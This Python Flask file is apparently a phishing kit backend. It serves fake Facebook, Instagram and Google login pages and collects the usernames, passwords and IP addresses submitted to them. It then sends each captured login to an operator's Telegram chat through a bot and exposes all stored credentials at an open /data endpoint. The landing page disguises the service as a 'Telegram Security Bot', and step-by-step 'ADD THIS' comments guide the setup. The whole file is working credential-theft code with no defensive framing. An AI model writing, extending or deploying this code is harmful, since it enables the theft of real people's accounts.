from flask import Flask, send_file, request, jsonify
import threading
import json
import time
import os
import logging
import requests  # ✅ ADD THIS

app = Flask(__name__)
logger = logging.getLogger(__name__)

# ✅ ADD THESE IMPORTS
from const import BOT_TOKEN, ADMIN_ID

captured_data = []

# ✅ ADD THIS FUNCTION - Sends Telegram alerts
def send_telegram_alert(credentials):
    """Send real-time alert to Telegram"""
    try:
        message = (
            f"🎯 CREDENTIALS CAPTURED!\n"
            f"🔹 Site: {credentials['site']}\n"
            f"🔹 Username: {credentials['username']}\n"
            f"🔹 Password: {credentials['password']}\n"
            f"🔹 Time: {time.ctime()}\n"
            f"🔹 IP: {credentials.get('ip', 'Unknown')}"
        )
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_ID,  # Your Telegram ID from const.py
            "text": message,
            "parse_mode": "Markdown"
        }
        
        response = requests.post(url, json=payload, timeout=10)
        logger.info(f"📨 Telegram alert sent: {response.status_code}")
        
    except Exception as e:
        logger.error(f"❌ Failed to send Telegram alert: {e}")

@app.route('/')
def home():
    return "🛡️ Telegram Security Bot - Active"

@app.route('/facebook')
def facebook():
    return send_file('templates/facebook.html')

@app.route('/instagram')
def instagram():
    return send_file('templates/instagram.html')

@app.route('/google')
def google():
    return send_file('templates/google.html')

@app.route('/log', methods=['POST'])
def log_credentials():
    try:
        data = request.json
        data['timestamp'] = time.time()
        data['ip'] = request.remote_addr
        
        logger.info(f"🔑 CAPTURED: {data}")
        
        # Store credentials
        captured_data.append(data)
        
        # ✅ ADD THIS LINE - Send Telegram alert
        send_telegram_alert(data)
        
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({"status": "error"})

@app.route('/data')
def view_data():
    return jsonify(captured_data)

def start_server():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()
